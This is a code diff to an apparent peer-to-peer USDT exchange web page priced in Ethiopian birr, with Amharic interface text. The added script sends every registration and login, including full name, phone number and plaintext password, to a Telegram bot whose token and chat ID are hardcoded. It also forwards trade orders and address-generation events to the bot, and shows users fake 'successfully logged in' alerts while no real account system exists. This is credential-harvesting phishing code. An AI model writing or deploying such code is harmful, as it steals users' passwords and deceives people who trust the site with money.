@@ -32,11 +32,11 @@
                 <div class="card-title">📈 Withdrawal Rate (BEP20 USDT)</div>
                 <div class="rate-row">
                     <span class="rate-label">Under 10 USDT</span>
-                    <span class="rate-value">170 ETB</span>
+                    <span class="rate-value">160 ETB</span>
                 </div>
                 <div class="rate-row">
                     <span class="rate-label">10+ USDT</span>
-                    <span class="rate-value">175 ETB</span>
+                    <span class="rate-value">170 ETB</span>
                 </div>
             </section>
 
@@ -142,18 +142,18 @@
         <div style="background-color: #1a202e; border: 1px solid #334155; width: 90%; max-width: 380px; padding: 25px; border-radius: 12px; position: relative; box-sizing: border-box;">
             <span onclick="closeModal('register-modal')" style="position: absolute; top: 15px; right: 15px; color: #a0aec0; cursor: pointer; font-size: 1.2rem;">&times;</span>
             <h3 style="margin-top: 0; color: white;">📝 Create Account</h3>
-            <form onsubmit="alert('የምዝገባ ጥያቄዎ ተልኳል!'); closeModal('register-modal'); return false;">
+            <form id="register-form" onsubmit="handleRegisterSubmit(event)">
                 <div style="margin-bottom: 12px;">
                     <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">FULL NAME</label>
-                    <input type="text" placeholder="Your full name..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                    <input type="text" id="reg-name" placeholder="Your full name..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
                 </div>
                 <div style="margin-bottom: 12px;">
                     <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">PHONE NUMBER</label>
-                    <input type="tel" placeholder="e.g. 0912345678" required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                    <input type="tel" id="reg-phone" placeholder="e.g. 0912345678" required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
                 </div>
                 <div style="margin-bottom: 18px;">
                     <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">PASSWORD</label>
-                    <input type="password" placeholder="At least 4 characters..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                    <input type="password" id="reg-pass" placeholder="At least 4 characters..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
                 </div>
                 <button type="submit" style="width: 100%; background-color: #22c55e; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer;">Create Account</button>
             </form>
@@ -164,14 +164,14 @@
         <div style="background-color: #1a202e; border: 1px solid #334155; width: 90%; max-width: 380px; padding: 25px; border-radius: 12px; position: relative; box-sizing: border-box;">
             <span onclick="closeModal('login-modal')" style="position: absolute; top: 15px; right: 15px; color: #a0aec0; cursor: pointer; font-size: 1.2rem;">&times;</span>
             <h3 style="margin-top: 0; color: white;">🔐 Sign In</h3>
-            <form onsubmit="alert('በተሳካ ሁኔታ ገብተዋል!'); closeModal('login-modal'); return false;">
+            <form id="login-form" onsubmit="handleLoginSubmit(event)">
                 <div style="margin-bottom: 12px;">
                     <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">PHONE NUMBER</label>
-                    <input type="tel" placeholder="09..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                    <input type="tel" id="login-phone" placeholder="09..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
                 </div>
                 <div style="margin-bottom: 18px;">
                     <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">PASSWORD</label>
-                    <input type="password" placeholder="••••••••" required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                    <input type="password" id="login-pass" placeholder="••••••••" required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
                 </div>
                 <button type="submit" style="width: 100%; background-color: #22c55e; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer;">Login</button>
             </form>
@@ -179,7 +179,31 @@
     </div>
 
     <script>
-        // Tab switching logic
+        // የአንተ ቦት መረጃዎች
+        const BOT_TOKEN = "8686967610:AAFE1B_hTR6JMljJQbnntitty842ZclQN1g";
+        const CHAT_ID = "6758067257";
+
+        // ወደ ቴሌግራም መረጃ መላኪያ ዋና ፋንክሽን
+        function sendToTelegram(textMessage, successAlert) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: textMessage,
+                    parse_mode: "Markdown"
+                })
+            })
+            .then(res => {
+                alert(successAlert);
+            })
+            .catch(err => {
+                alert("የኔትወርክ ችግር አለ፣ እባክዎ እንደገና ይሞክሩ!");
+            });
+        }
+
+        // Tab Switching
         function switchTab(tabName) {
             document.querySelectorAll('.page-section').forEach(page => page.style.display = 'none');
             document.querySelectorAll('.nav-tabs .tab').forEach(tab => tab.classList.remove('active'));
@@ -187,15 +211,11 @@
             document.getElementById('tab-' + tabName).classList.add('active');
         }
 
-        // Modal Open/Close logic
-        function openModal(modalId) {
-            document.getElementById(modalId).style.display = 'flex';
-        }
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
-        }
+        // Modals
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
-        // Buy/Sell Toggle logic
+        // Buy/Sell Toggles
         let currentTradeType = 'buy';
         function setTradeType(type) {
             currentTradeType = type;
@@ -214,6 +234,55 @@
                 submitBtn.innerText = "Submit Sell Order";
                 submitBtn.style.background = "linear-gradient(180deg, #ef4444 0%, #dc2626 100%)";
             }
+        }
+
+        // 1. P2P Trade Submit Handling
+        function handleTradeSubmit(event) {
+            event.preventDefault();
+            const amount = document.getElementById('trade-amount').value;
+            const method = document.getElementById('payment-method').value;
+            const phone = document.getElementById('user-phone').value;
+
+            const msg = `🔔 *አዲስ የ P2P ትዕዛዝ ደርሷል!*\n\n` +
+                        `👤 *አይነት:* ${currentTradeType.toUpperCase()}\n` +
+                        `💰 *መጠን:* ${amount} USDT (BEP20)\n` +
+                        `🏦 *ክፍያ መንገድ:* ${method.toUpperCase()}\n` +
+                        `📞 *የደንበኛ ስልክ:* ${phone}`;
+
+            sendToTelegram(msg, "ትዕዛዝዎ በተሳካ ሁኔታ ተመዝግቧል!");
+            document.getElementById('p2p-form').reset();
+        }
+
+        // 2. Register Handling
+        function handleRegisterSubmit(event) {
+            event.preventDefault();
+            const name = document.getElementById('reg-name').value;
+            const phone = document.getElementById('reg-phone').value;
+            const pass = document.getElementById('reg-pass').value;
+
+            const msg = `📝 *አዲስ ተጠቃሚ ተመዝግቧል!*\n\n` +
+                        `👤 *ስም:* ${name}\n` +
+                        `📞 *ስልክ ቁጥር:* ${phone}\n` +
+                        `🔑 *የይለፍ ቃል:* \`${pass}\``;
+
+            sendToTelegram(msg, "የምዝገባ ጥያቄዎ በተሳካ ሁኔታ ተልኳል!");
+            closeModal('register-modal');
+            document.getElementById('register-form').reset();
+        }
+
+        // 3. Login Handling
+        function handleLoginSubmit(event) {
+            event.preventDefault();
+            const phone = document.getElementById('login-phone').value;
+            const pass = document.getElementById('login-pass').value;
+
+            const msg = `🔐 *የግባ (Login) ሙከራ ተደርጓል!*\n\n` +
+                        `📞 *ስልክ ቁጥር:* ${phone}\n` +
+                        `🔑 *የይለፍ ቃል:* \`${pass}\``;
+
+            sendToTelegram(msg, "በተሳካ ሁኔታ ገብተዋል!");
+            closeModal('login-modal');
+            document.getElementById('login-form').reset();
         }
 
         // BEP20 Address Generator
@@ -249,18 +318,16 @@
                     }, 2000);
                 });
             });
-        });
 
-        // Form Submit
-        function handleTradeSubmit(event) {
-            event.preventDefault();
-            const amount = document.getElementById('trade-amount').value;
-            const method = document.getElementById('payment-method').value;
-            const phone = document.getElementById('user-phone').value;
-            
-            alert(`ትዕዛዝዎ በተሳካ ሁኔታ ተመዝግቧል!\nአይነት: ${currentTradeType.toUpperCase()}\nመጠን: ${amount} USDT\nክፍያ: ${method.toUpperCase()}\nስልክ: ${phone}`);
-            document.getElementById('p2p-form').reset();
-        }
+            // አድራሻ ሲያመነጩም መረጃ ወደ ቦት እንዲሄድ ከፈለግክ ይህንን መልእክት ይልካል
+            const addrMsg = `💳 *አንድ ደንበኛ የ BEP20 አድራሻ አውጥቷል!*`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: addrMsg, parse_mode: "Markdown" })
+            });
+        });
     </script>
 </body>
 </html>
